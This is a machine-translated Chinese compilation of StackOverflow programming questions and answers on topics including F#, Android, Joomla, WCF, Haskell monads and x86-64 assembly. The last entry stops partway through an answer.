# StackOverflow 问答 10862000-10862999

# node.js - 使用 hogan.js 取消渲染模板视图

> ID：10862003
> 
> 赞同：0
> 
> 时间：2012-06-02T11:39:28.813
> 
> 标签：node.js, hogan.js, socketstream

有没有办法用 hogan.js 取消渲染模板。你可以把它隐藏起来，但是留下了很多带有 id 的元素，它可能会在你的网站上造成进一步的影响。

我环顾四周，但找不到答案。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T19:45:39.017

hogan.js 是一种模板语言。这意味着只需使用一些 javascript 对象就可以轻松呈现不同的 html 标记。它没有**操纵 DOM**的目的。

假设你有这样的html：

```
<body>
  ...stuff...
  <div id="div-1">...stuff...</div>
</body> 
```

你当然可以使用 jQuery：

```
$('#div-1').remove(); 
```

或者，如果它可以节省麻烦，您可以使用纯 javascript：

```
var elem = document.getElementById('div-1');
elem.parentNode.removeChild(elem); 
```

# iphone - 从少数国家下载的应用程序中没有 iAd

> ID：10862005
> 
> 赞同：1
> 
> 时间：2012-06-02T11:39:58.563
> 
> 标签：iphone, ios, ipad, ios5, iad

我在 iPhone 和 iPad 上的应用程序正在英国和美国接收 iAd。但在印度的 iPhone/iPad 上下载的应用程序中没有广告。

在 iTunes Connect 中，我可以看到来自不同国家/地区的广告请求，但只有美国和英国的展示次数几乎等于广告请求。但所有其他国家/地区的印象数为 0。

我需要检查任何基于国家/地区的设置，以便在所有国家/地区都可以看到广告。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-02T11:44:51.557

它目前在印度不可用。

> iAd 广告目前正在美国、英国、德国、意大利、西班牙、法国和日本 App Store 上的应用程序中投放。

来源：[https ://developer.apple.com/iad/](https://developer.apple.com/iad/)

# .net - 在 F# 中，案例标识符的“is X”运算符？

> ID：10862010
> 
> 赞同：1
> 
> 时间：2012-06-02T11:40:33.633
> 
> 标签：.net, f#, functional-programming

假设我有以下有区别的联合和价值：

```
type DisUnion = 
    | One of string
    | Two of string
    | Three of string * string

let myVal = One("One") 
```

我知道我可以使用模式匹配来确定`myVal`属于哪个案例，如下所示：

```
let whatever (x : DisUnion) = match x with
    | One(str) -> "It was One"
    | Two(str) - > "It was two"
    | Three(str, str) -> "It was three" 
```

但我似乎找不到允许我在*没有*模式匹配的情况下确定案例标识符的运算符或方法，例如：

```
let isOne (x : DisUnion) = x :? One //I thought this would work, but it doesn't. 
```

我该怎么做？任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-02T11:52:48.990

```
let isOne = function One(_) -> true | _ -> false 
```

Note that this is equivalent to:

```
let isOne x = match x with One(_) -> true | _ -> false 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-02T14:07:24.007

F# 中没有内置这样的运算符，但有几种不同的方法可以实现您的目标。

一种新颖的方法是通过反射，它会丢失类型检查，因此通常不会被使用。我们注意到判别联合是由 F# 编译器实现的，在您的示例中，它使用`DisUnion`作为基类和每个联合案例`One`、、`Tow`和`Three`作为 的子类`DisUnion`。因此，我们可以实现以下运算符：

```
let (=?) duInstance caseName = 
    let duInstanceTy = duInstance.GetType()
    duInstanceTy.Name = caseName 
```

并像这样使用它：

```
> One("hi") =? "One";;
val it : bool = true
> One("hi") =? "Two";;
val it : bool = false
> One("hi") =? "NotValid";;
val it : bool = false 
```

然而，更典型的是实现一组静态成员，`DisUnion`以静态类型检查的方式完成工作。实现起来有点冗长，但这是一次性成本，因为使用静态成员很好。

```
type DisUnion = 
    | One of string
    | Two of string
    | Three of string * string
    static member isOne x =
        match x with
        | One _ -> true
        | _ -> false
    static member isTwo x =
        match x with
        | Two _ -> true
        | _ -> false
    static member isThree x =
        match x with
        | Three _ -> true
        | _ -> false 
```

并像这样使用它：

```
> DisUnion.isOne (One("hi"));;
val it : bool = true
> DisUnion.isOne (Two("hi"));;
val it : bool = false
> DisUnion.isOne (NotValid("hi"));;

  DisUnion.isOne (NotValid("hi"));;
  ----------------^^^^^^^^

C:\stdin(5,17): error FS0039: The value or constructor 'NotValid' is not defined 
```

# c# - 如何在 Windows Phone 中将 URL 添加到您的收藏夹以及如何在移动 HTML 中缓存数据

> ID：10862012
> 
> 赞同：-4
> 
> 时间：2012-06-02T11:41:06.347
> 
> 标签：c#, windows-phone-7, caching

我正在尝试找到在 Windows Phone 中缓存数据的解决方案。但我找不到解决方案，我是新开发人员，如何将 URL 添加到 Windows Mobile 中的收藏夹中，我想将其保存在收藏夹中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T11:52:31.917

If I understand your question correctly: You are asking "How to save the browsed URLs programmatically?"

You can use the Navigating Navigated events of WebBrowser control to get the details of the current URL being navigated, and so you can store it.

```
private void webBrowser1_Navigated(object sender, WebBrowserNavigatedEventArgs e)
{
    string currentUrl = webBrowser1.Url.ToString();
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-10-28T11:33:21.790

您将无法将应用中的 URL 保存到 IE 的收藏夹列表中。唯一可以访问该列表的应用程序是 IE 本身。对不起。

# php - 我正在尝试在 Joomla 中添加一个插件，但它给了我一个致命错误

> ID：10862013
> 
> 赞同：0
> 
> 时间：2012-06-02T11:41:06.783
> 
> 标签：php, joomla, syntax-error

致命错误：在第 435 行调用 C:\xampp\htdocs\jsf\libraries\joomla\cache\storage\memcache.php 中非对象的成员函数 add()

```
protected function lockindex()
{
    $looptime = 300;
    $data_lock = self::$_db->add($this->_hash . '-index_lock', 1, false, 30);

    if ($data_lock === false)
    {

        $lock_counter = 0;

        // Loop until you find that the lock has been released.  that implies that data get from other thread has finished
        while ($data_lock === false)
        {
            if ($lock_counter > $looptime)
            {
                return false;
                break;
            }

            usleep(100);
            $data_lock = self::$_db->add($this->_hash . '-index_lock', 1, false, 30);
            $lock_counter++;
        }
    }

    return true;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T21:54:06.033

转到 configuration.php 并更改为此设置。

```
public $caching = '0';
public $cache_handler = 'file';
public $cachetime = '15'; 
```

代替：-

```
public $caching = '0';
public $cache_handler = 'memcache';
public $cachetime = '30';
public $memcache_persist = '1';
public $memcache_compress = '0';
public $memcache_server_host = 'mem';
public $memcache_server_port = '11211'; 
```

这将通过手动将其切换到文件来修复致命的崩溃错误。

# postgresql - 如何链接 apache tomcat 7 和 postgresql

> ID：10862015
> 
> 赞同：-5
> 
> 时间：2012-06-02T11:41:11.800
> 
> 标签：postgresql, tomcat

我找不到链接 apache tomcat 和 postgresql 的方法。我尝试按照[apache 文档中的此链接进行操作](http://tomcat.apache.org/tomcat-7.0-doc/jndi-datasource-examples-howto.html)。但我不知道在哪里放什么文件，文件夹

一切都是错误的，请帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-02T11:49:51.597

当然有可能。也许你应该重新安装谷歌：它肯定能找到对你有帮助的东西。

从[JDBC 教程](http://docs.oracle.com/javase/tutorial/jdbc/basics/)开始。这将解决连接到 PostgreSQL 的问题。

接下来，您将需要如何创建 Web 应用程序并将其部署在 Tomcat 上。查看[第一个 Web 应用程序](http://tomcat.apache.org/tomcat-7.0-doc/)。当您在那里时，请参阅 JNDI 数据源。

你知道[如何写一个 servlet](http://www.apl.jhu.edu/~hall/java/Servlet-Tutorial/)吗？学习那个。

这些是你需要的。UI 是另一回事，但这将向您展示服务器端。祝你好运。

# c++ - 纹理映射 - 坐标

> ID：10862020
> 
> 赞同：-2
> 
> 时间：2012-06-02T11:41:44.200
> 
> 标签：c++, opengl, coordinates

我正在处理纹理映射，发现这个例子我无法完全弄清楚，我不确定我得到的答案是否正确。有人可以帮我吗

问题：

![堆](../Images/5ed569758978231fddc9d7b101c929ca.png)

我以为答案是：`bottom-right vertex (1,0), top-left:(0,1), top-right(1,1)` 我的答案正确吗？如果不是，你能解释一下纹理映射是如何工作的。（解释中不需要 C++ 代码......我只想要类似于上面的示例）。

编辑：我认为右上角是 (2,1)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T11:59:39.670

四边形由2个三角形组成。左边的三角形是原始纹理的左下半部分。右边的三角形也是相同的图像，除了镜像。如果您查看四边形的角，您将很容易理解纹理坐标：

```
original texture:

mountain peak  sky
(0, 1)(0.5, 1) (1, 1)
+--------------+
|              |
|              |
|              |
|              |
|              |
|              |
|              |
+--------------+
(0, 0)         (1, 0)
grass          sheep

quadrilateral

   peak               grass
       +--------------+
      /              /
     /              /
    /              /
   /              /
  /              /
 /              /
+--------------+
grass         sheep 
```

所以：

```
 (0.5, 1)             (0, 0)
       +--------------+
      /              /
     /              /
    /              /
   /              /
  /              /
 /              /
+--------------+
(0, 0)         (1, 0) 
```

# twitter-bootstrap - twitter bootstrap 上的语法高亮显示

> ID：10862021
> 
> 赞同：16
> 
> 时间：2012-06-02T11:41:46.137
> 
> 标签：twitter-bootstrap, prettify

我正在尝试使用 Google prettify 突出显示一些语法，但到目前为止，它不起作用。

```
<link href="prettify.css" type="text/css" rel="stylesheet" />
<script type="text/javascript" src="prettify.js"></script>

<body onload="prettyPrint()" bgcolor="white">

<pre class="prettyprint">
  <code class="language-css">
  // Some source code

    class Foo {
      public int Bar { get; set; }
    }
  </code>
</pre> 
```

有没有一种解决方案可以使这项工作在不与引导程序中已经存在的 pre 标签混淆太多的情况下进行？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-06-02T11:52:24.150

**EDIT:** for twitter bootstrap 2.0.x, it works fine with 2.1.x

Use the those 2 files instead of using the method describe in the doc.

[http://twitter.github.com/bootstrap/assets/js/google-code-prettify/prettify.css](http://twitter.github.com/bootstrap/assets/js/google-code-prettify/prettify.css)

[http://twitter.github.com/bootstrap/assets/js/google-code-prettify/prettify.js](http://twitter.github.com/bootstrap/assets/js/google-code-prettify/prettify.js)

This works for me

```
<!DOCTYPE html>
<html lang="en">
<head>
<link href="css/bootstrap.css" type="text/css" rel="stylesheet" />
<link href="prettify.css" type="text/css" rel="stylesheet" />
<script type="text/javascript" src="prettify.js"></script>
</head>
<body onload="prettyPrint()" bgcolor="white">
<pre class="prettyprint linenums languague-css">
// Some source code
class Foo {
    public int Bar { get; set; }
}
</pre>
</body>
</html> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-06-21T16:37:42.513

不知道为什么不建议修改：

```
<script>
    // Activate Google Prettify in this page
    addEventListener('load', prettyPrint, false);
    $(document).ready(function(){
        // Add prettyprint class to pre elements
        $('pre').addClass('prettyprint');           
    }); // end document.ready
</script> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-25T19:09:23.840

链接到 2 个文件 prettify.css 后，prettify.js 将此代码添加到您的页脚

```
<script>
// @prettify
!function ($) {
  $(function(){
  window.prettyPrint && prettyPrint()   
  })
}(window.jQuery);
// #prettify
</script> 
```

# haskell - 单子只是组合函数的方式，否则这些函数不会组合吗？

> ID：10862022
> 
> 赞同：6
> 
> 时间：2012-06-02T11:42:02.090
> 
> 标签：haskell, monads

bind 函数看起来与组合函数非常相似。它有助于组合返回 monad 的函数。

关于 monad，还有什么比这个想法更有启发性的吗？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-06-02T11:50:40.710

> 关于 monad，还有什么比这个想法更有启发性的吗？

是的，非常如此！

一元绑定是一种组合函数的方式，其中除了将函数应用于输入之外，还会发生其他事情*。**其他东西*是什么取决于正在考虑的单子。

*   monad 是函数组合，`Maybe`链中的一个函数可能会失败，在这种情况下，失败会自动传播到链的末尾。该表达式`return x >>= f >>= g`适用`f`于 value `x`。如果结果是`Nothing`（即失败），则整个表达式返回`Nothing`，没有其他工作发生。否则，`g`应用于`f x`并返回其结果。

*   `Either e`monad是某种类型，它`e`是函数组合，可能会因类型错误而失败`e`。这在概念上类似于`Maybe`monad，但我们可以获得更多关于失败发生的方式和位置的信息。

*   `List`monad 是函数组合，可以返回多个值。如果`f`和`g`是返回输出列表的函数，则`return x >>= f >>= g`适用`f`于`x`，然后适用`g`于 的每个输出`f`，将这些应用程序的所有输出收集到一个大列表中。

其他单子代表各种其他上下文中的功能组合。非常简短：

*   `Writer w`monad 是函数组合，类型的值被`w`累积在一边。例如，通常`w = [String]`（字符串列表）对日志记录很有用。

*   monad 是函数组合，`Reader r`其中每个函数也可以依赖于 type 的值`r`。这在为特定领域的语言构建评估器时很有用，`r`可能是从变量名到语言中值的映射 - 例如，这允许简单地实现词法闭包。

*   `State s`monad 有点像 reader 和 writer 的组合。它是函数组合，其中每个函数都可以依赖和修改 type 的值`s`。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-06-02T11:44:01.317

事实上，构图的观点本身就很有启发性。

Monads 可以看作是形式函数之间的一些“时髦组合” `a -> Mb`。您可以通过 monad 操作将`f : a -> M b`和组合`g: b -> M c`成 something `a -> M c`（只需绑定`f`into的返回值`g`）。

这会将形式的箭头转换为类别的`a -> M b`箭头，称为 的*Kleisli 类别*`M`。

如果`M`不是一个 monad 而只是一个函子，你将只能 compose `fmap g`and `f`into something `(fmap g) . f :: a -> M (M c)`。单子有`join :: M (M a) -> M a`我让您定义为仅使用单子操作的（简单且有用的）练习（对于数学家来说，`join`通常是单子定义的一部分）。然后`join . (fmap g) . f`提供 Kleisli 类别的组成。

因此，可以看到 monadic 组合的所有 funk 发生在内部`join`，`join`代表*副作用的组合*：因为`IO`它对效果进行排序，因为`List`它连接列表，因为`Maybe`它在结果为时“停止计算” `Nothing`，因为`Writer`它对写入进行排序，因为`State`它对状态等操作进行排序。如果您了解类 C 语言，它可以被视为“可重载的分号”。以这种方式思考 monad 是非常有启发性的。

当然，Dan Piponi 比我解释得更好，下面是他的一些帖子，您可能会觉得很有启发性：http: [//blog.sigfpe.com/2006/06/monads-kleisli-arrows-comonads-and。 html](http://blog.sigfpe.com/2006/06/monads-kleisli-arrows-comonads-and.html)

# android - Logcat显示-实物已被删除

> ID：10862025
> 
> 赞同：1
> 
> 时间：2012-06-02T11:42:22.767
> 
> 标签：android, facebook

我正在做“Android 上的 Facebook 集成”并在 facebook 墙上发布状态。我已关注“http://www.londatiga.net/it/how-to-use-facebook-sdk-to-post-status-from-安卓”。但是当我按下按钮发布时，它卡在模拟器中。在 logcat 中显示为“真实对象已被删除”。你能告诉我是什么原因。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T12:12:01.730

您在真实设备中也遇到此错误吗？像这样的异常通常是模拟器问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T12:15:59.753

你的`AndroidManifest.xml`档案里有 `android:configChanges="keyboard|keyboardHidden|orientation"`吗？

如果是这样，请尝试删除该行，然后再次运行。

# android - 图像分辨率

> ID：10862030
> 
> 赞同：1
> 
> 时间：2012-06-02T11:43:02.670
> 
> 标签：android, android-camera, android-image, android-resolution

我有一个相机应用程序，我在其中拍摄图像并将其存储在 SD 卡中。

当我检查存储图像的分辨率时，发现它是 120X160 像素。

但是，相机拍摄的正常图像是 640X480 像素。

我不希望分辨率降低。你能解释一下为什么会这样吗？

```
@Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        // TODO Auto-generated method stub

        super.onActivityResult(requestCode, resultCode, data);
        if(resultCode == RESULT_OK){
            Bundle extras = data.getExtras();

            Bitmap bmp1 = (Bitmap) extras.get("data");

            //now storing the image in sdcard, folder name is same as the model name

            ByteArrayOutputStream bytes1 = new ByteArrayOutputStream();
            scaled1.compress(Bitmap.CompressFormat.PNG, 100, bytes1);

            File f1 = new File(folder,"bmp1.png");

            try {
                f1.createNewFile();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            FileOutputStream fo1 = null;

            try {
                fo1 = new FileOutputStream(f1);
            } catch (FileNotFoundException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            try {
                fo1.write(bytes1.toByteArray());
                fo1.close();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
} 
```

我必须创建自己的相机活动吗？我是初学者..所以请帮忙

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-10-08T01:50:56.370

```
package com.net.test;

import java.awt.AlphaComposite;
import java.awt.Graphics2D;
import java.awt.RenderingHints;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

import javax.imageio.ImageIO;
import javax.imageio.stream.ImageInputStream;

import com.sun.image.codec.jpeg.ImageFormatException;
import com.sun.image.codec.jpeg.JPEGCodec;
import com.sun.image.codec.jpeg.JPEGEncodeParam;
import com.sun.image.codec.jpeg.JPEGImageEncoder;

public class TestImagesDpi {

    public static void main(String[] args) throws ImageFormatException, IOException {
        FileOutputStream fos = null;  

//      byte[] rawData = getRawBytesFromFile(""); // some code to read raw bytes from image file
//      ImageInputStream iis = ImageIO.createImageInputStream(new ByteArrayInputStream(rawData));
        BufferedImage images = ImageIO.read(new File("C:\\Users\\Rajesh\\Desktop\\richagangopadhyay217.jpg"));
//      images.se

        int type = images.getType() == 0? BufferedImage.TYPE_INT_ARGB : images.getType();

        images = resizeImageWithHint(images, type);

        //        for (int i = 0; i < imageFiles.length; i++) {  
            fos = new FileOutputStream(new File("C:\\Users\\Rajesh\\Desktop\\test.jpg"));  
            JPEGImageEncoder jpegEncoder = JPEGCodec.createJPEGEncoder(fos);  
            JPEGEncodeParam jpegEncodeParam = jpegEncoder.getDefaultJPEGEncodeParam(images);  
            jpegEncodeParam.setDensityUnit(JPEGEncodeParam.DENSITY_UNIT_DOTS_INCH);  
            jpegEncodeParam.setXDensity(600);
            jpegEncodeParam.setYDensity(600);
            jpegEncodeParam.setQuality(1.0f, true);  
            jpegEncoder.encode(images, jpegEncodeParam);  
            fos.close();  
//        }  
    }

    private static BufferedImage resizeImageWithHint(BufferedImage originalImage, int type){

        BufferedImage resizedImage = new BufferedImage(256, 256, type);
        Graphics2D g = resizedImage.createGraphics();
        g.drawImage(originalImage, 0, 0, 256, 256, null);
        g.dispose();    
        g.setComposite(AlphaComposite.Src);

        g.setRenderingHint(RenderingHints.KEY_INTERPOLATION,
        RenderingHints.VALUE_INTERPOLATION_BILINEAR);
        g.setRenderingHint(RenderingHints.KEY_RENDERING,
        RenderingHints.VALUE_RENDER_QUALITY);
        g.setRenderingHint(RenderingHints.KEY_ANTIALIASING,
        RenderingHints.VALUE_ANTIALIAS_ON);

        return resizedImage;
        }   

    private static byte[] getRawBytesFromFile(String string) throws FileNotFoundException {
        // TODO Auto-generated method stub

        File file = new File("C:\\Users\\Rajesh\\Desktop\\richagangopadhyay217.jpg");

        FileInputStream fis = new FileInputStream(file);
        //create FileInputStream which obtains input bytes from a file in a file system
        //FileInputStream is meant for reading streams of raw bytes such as image data. For reading streams of characters, consider using FileReader.

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[1024];
        try {
            for (int readNum; (readNum = fis.read(buf)) != -1;) {
                //Writes to this byte array output stream
                bos.write(buf, 0, readNum); 
                System.out.println("read " + readNum + " bytes,");
            }
        } catch (IOException ex) {
//            Logger.getLogger(ConvertImage.class.getName()).log(Level.SEVERE, null, ex);
        }

        byte[] bytes = bos.toByteArray();
        return bytes;
    }
} 
```

# wordpress - 在 wordpress 上使用评论

> ID：10862035
> 
> 赞同：0
> 
> 时间：2012-06-02T11:43:55.020
> 
> 标签：wordpress, comments

我正在使用 wordpress 创建一个网页。我想在表单中插入一些隐藏的元素，但评论标签不起作用。wordpress 将评论标签放在“p”标签中。我使用了所有评论方法。它不起作用。

谁能告诉我如何使用 wordpress 在网页中插入评论？

谢谢我提前。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T11:52:46.493

I take it you are trying to build a form using the add/edit page screen in wp-admin i.e. wp-admin/post-new.php?post_type=page? If so, you might never succeed in your endeavour, but I would give it a try using tinymce-advanced plugin, as you can turn a lot of the filtering of your source code off, and this might solve the problem. Try it, if not let me know and I will tell you how to manually add functionality to stop Wordpress from messing with html code in wp-admin text editor.

# iphone - 关于将附加组件添加到应用程序的建议

> ID：10862037
> 
> 赞同：0
> 
> 时间：2012-06-02T11:44:17.590
> 
> 标签：iphone, objective-c, ios, xcode, ipad

我有一个显示卡通人物的应用程序。我想开始提供额外的角色，甚至在角色上放置配件。

任何人都可以就最好的方法提供建议吗？

可以通过应用商店完成，还是我需要有自己的机制来下载它们？

我见过很多应用程序，您可以通过触摸应用程序中的图标来下载衣服等，但我还没有找到任何文档或教程。

任何帮助是极大的赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T11:47:07.310

您可以为此使用应用内购买。Apple 将处理财务方面的事情（通过 iTunes 向用户收费），而您必须处理其余的事情（下载或解锁新内容）。

请参阅文档：[使用应用内购买进行销售](https://developer.apple.com/appstore/in-app-purchase/index.html)

本教程：[应用内购买简介](http://www.raywenderlich.com/2797/introduction-to-in-app-purchases)

# android - 从java调用带有对象作为参数的RESTful WCFservice方法

> ID：10862038
> 
> 赞同：1
> 
> 时间：2012-06-02T11:44:21.250
> 
> 标签：android, http-post, wcf-rest, webinvoke

我有一个 RESTful WCF 服务，它的一种方法使用对象作为参数

```
[WebInvoke(UriTemplate = "save", Method = "POST", RequestFormat = WebMessageFormat.Xml, ResponseFormat= WebMessageFormat.Xml), OperationContract]
        public SampleItem Create(SampleItem instance)
        {
            return new SampleItem() { Id = 1, StringValue = "saved" };
            // TODO: Add the new instance of SampleItem to the collection
            //throw new NotImplementedException();
        } 
```

我正在尝试从我的 eclipse android 项目中调用此方法。我正在使用这些代码行

```
DefaultHttpClient httpClient = new DefaultHttpClient();
HttpPost post=new HttpPost("http://10.0.2.2:2768/Service1.svc/save");
ArrayList<NameValuePair> nvp= new ArrayList<NameValuePair>();

nvp.add(new BasicNameValuePair("Id", "1"));
nvp.add(new BasicNameValuePair("StringValue", "yolo"));

post.setEntity(new UrlEncodedFormEntity(nvp));
HttpResponse httpResponse = httpClient.execute(post);
HttpEntity httpEntity = httpResponse.getEntity();
String xml = EntityUtils.toString(httpEntity); 
```

每次我`Method not allowed.`在服务方法返回的 XML 中收到此错误时。

我尝试从浏览器调用它，但在那里遇到了同样的错误。

请告诉我我做错了什么以及我能做些什么。

提前感谢任何可以提供帮助的人。

注意：其他不使用对象作为参数的方法工作正常。

编辑：成功尝试了 Fiddler2。但又停滞了。

我尝试`SampleItem Create(SampleItem instance)`使用 url 调用该方法`http://localhost:2768/Service1.svc/save`并且它有效。该方法以 XML 格式返回对象。

在提琴手中，我将请求正文添加为 `<SampleItem xmlns="http://schemas.datacontract.org/2004/07/WcfRestService1" xmlns:i="http://www.w3.org/2001/XMLSchema-instance"><Id>1</Id><StringValue>saved</StringValue></SampleItem>`

但问题是我找不到任何方法将此 xml 字符串添加到**HttpPost**或**HttpRequest**作为**requestbody** eclipse android 项目。

注意：将 xml 字符串作为**Header**或**UrlEncodedFormEntity**传递不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-26T04:46:02.183

最后我成功地将一个**json**对象发送到我的**WCF 服务**这是我的代码

```
URI uri = new URI("http://esimsol.com/droidservice/pigeonlibrary.service1.svc/save");

JSONObject jo1 = new JSONObject();
jo1.put("Id", "4");
jo1.put("StringValue", "yollo");

HttpURLConnection conn = (HttpURLConnection) uri.toURL().openConnection();
conn.setRequestProperty("Content-Type","application/json; charset=utf-8");
conn.setRequestProperty("Accept", "application/json");
conn.setRequestProperty("User-Agent", "Pigeon");
conn.setChunkedStreamingMode(0);
conn.setDoInput(true);
conn.setDoOutput(true);
conn.setRequestMethod("POST");
conn.connect();

DataOutputStream out = new DataOutputStream(conn.getOutputStream());
out.write(jo1.toString().getBytes());
out.flush();

int code = conn.getResponseCode();
String message = conn.getResponseMessage();

InputStream in = conn.getInputStream();
StringBuffer sb = new StringBuffer();
String reply;

try {
int chr;
while ((chr = in.read()) != -1) {
sb.append((char) chr);
}
reply = sb.toString();
} finally {
in.close();
}

SampleItem SI = new SampleItem();
SI=new Gson().fromJson(reply, SampleItem.class);

Toast.makeText(getApplicationContext(), SI.getStringValue(),Toast.LENGTH_LONG).show();

conn.disconnect(); 
```

感谢**StackOverFlow**。我不得不结合一些代码片段来实现这一点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T13:10:06.647

首先，您应该让 Web 服务方法在浏览器中工作——我建议使用 Fiddler2——它更容易用您的对象构造请求主体，并且在发布帖子时也可以设置请求标头。它将向您显示响应，因此应该有助于调试。至于您的代码，我正在对 WCF 服务进行 POST 而不是

```
post.setEntity(new UrlEncodedFormEntity(nvp)); 
```

我只是在做：

```
HttpPost request = new HttpPost(url);

// Add headers.
for(NameValuePair h : headers)
{
     request.addHeader(h.getName(), h.getValue());
} 
```

（我正在使用 JSONObjects，并且我的 WebInvoke 参数中有 RequestFormat = WebMessageFormat.Json。

此外，请检查您在 url 中使用正确的 UriTemplate 名称，因为它们区分大小写。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T14:11:41.600

要调用该 WCF 服务，您必须构建有效的 SOAP 请求并发布它。最好在 Android 上使用一些 SOAP 协议栈 - 例如[kSoap2](http://code.google.com/p/ksoap2-android/)。

这是使用 kSoap2 调用 WCF 服务的[示例。](https://stackoverflow.com/questions/2589486/how-to-call-a-wcf-service-using-ksoap2-on-android)只需在您的项目中添加 KSOAP2 库。关于我们如何在 Android 项目中添加 KSOAP2，请参阅[这篇文章](https://stackoverflow.com/questions/10020740/how-do-i-import-jars-in-an-android-project)

# iphone - 如何解决 iPhone 应用程序 hpple HTML Parsing 'libxml/tree.h' file not found？

> ID：10862039
> 
> 赞同：0
> 
> 时间：2012-06-02T11:44:35.270
> 
> 标签：iphone, ios, compiler-errors, html-parsing, hpple

我正在尝试使用 hpple for iPhone 应用程序解析 HTML URL 内容。我想从这个 URL [http://www.example.com/mobile/403.html](http://www.example.com/mobile/403.html)解析和获取数据。我用谷歌找到了`hpple for HTML parsing`。我从`github`. 当我开始运行项目时，发生以下错误

`'libxml/tree.h' file not found`

我已经添加了这一行`${SDKROOT}/usr/include/libxml2 in project->build->header search paths`，但它看起来不像这样`iPhoneos3.1.2/usr/include/libxml2/**`，而且我已经包含`libxml2.dylib and libxml2.2.dylib`在我的项目中。我在 XCode 4.2 中工作。你能帮忙解决这个错误吗？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-18T19:15:06.217

确保添加此行：

```
${SDKROOT}/usr/include/libxml2 
```

在 TARGETS->build->header 搜索路径中...

并确保您像这样将您的 hpple 文件复制到您的项目中......

![在此处输入图像描述](../Images/aa24be14c4b494eb011f386e3611cdfd.png)

![在此处输入图像描述](../Images/2454d9187da16a3a22679bf49824d84f.png)

祝你好运，希望这能帮到你！

# linux - 段错误运行 cmp 'A', %al‽

> ID：10862040
> 
> 赞同：1
> 
> 时间：2012-06-02T11:44:44.053
> 
> 标签：linux, assembly, segmentation-fault, x86-64

为了我自己的病痛，我正在用 x86_64 程序集为 Linux 编写一个小程序。但是，在将立即操作数与寄存器进行比较的指令中，我遇到了一个对我来说完全没有意义的段错误。是什么赋予了？

这是导致崩溃的代码：

```
_start:
    sub $8, %rsp
    mov %rsp, %rbx
    lea le_string(%rip), %rsi
    mov %rsi, %rdi
    add $8, %rdi
    mov $26, %cl
    mov (%rsi), %al
    cmp 'A', %al /* This line segfaults */
    /* snip code that never runs */

le_string:
.ascii "YrFgevat" 
```

我正在使用`gcc -nostdlib`GNU 汇编器进行组装。

崩溃后转储寄存器显示：

*   `%rsi`包含指向字符串的预期指针
*   `%al`包含字符串中预期的第一个字符
*   `%rip`指向不涉及内存的指令

请忽略缺乏正常的调用约定——除了系统调用接口之外，我没有调用任何东西，而且它甚至在它到达那么远之前就崩溃了！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-02T11:44:44.630

`'A'`毕竟被解释为地址。如果要将其用作常量，则需要编写：

```
cmp $'A', %al 
```

# android - 用于 android 的 VIN 扫描库或 SDK

> ID：10862044
> 
> 赞同：1
> 
> 时间：2012-06-02T11:44:57.517
> 
> 标签：android

我正在开发一个需要 VIN 扫描的 android 应用程序。我没有找到任何好的库或 SDK。我试过 Zxing 但它不做 VIN 扫描。谁能帮我在我的应用程序中实现 VIN 扫描。任何 sdk 或库都将是可取的。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-09-01T20:28:37.073

现在有一个 google vision api，[https:](https://cloud.google.com/vision/docs/requests-and-responses) //cloud.google.com/vision/docs/requests-and-responses ，我已经对其进行了一些测试。需要在文本周围裁剪图像才能真正做到这一点，但在这种情况下效果很好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T12:23:29.033

好吧，您似乎正在寻找 OCR 解决方案 - 但很难通过金属压花提供良好的图像。你可以试试我们的安卓 OCR 库——你应该能够训练对少量不同字体的识别

[http://sourceforge.net/projects/javaocr/](http://sourceforge.net/projects/javaocr/)

# iphone - 访问 iphone 中可用的应用程序

> ID：10862045
> 
> 赞同：0
> 
> 时间：2012-06-02T11:44:57.827
> 
> 标签：iphone

嗨，我想访问 iphone 中可用的应用程序意味着下载的应用程序和内置应用程序。但这里的问题是，如果我使用 [[UIapplication sharedapplication]openurl:[NSURl url urlwithstring:@"http 访问 iphone 中可用的任何应用程序://www.skype.com"]] 像这样我可以成功访问该 iphone 应用程序，但如果我想回到我的应用程序，我没有找到任何方法，只有我必须点击主页按钮。所以无论如何都可以在任何时候回到我的应用程序。如果有人知道，请告诉我。感谢您。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T11:48:15.680

> 所以无论如何都可以在任何时候回到我的应用程序。

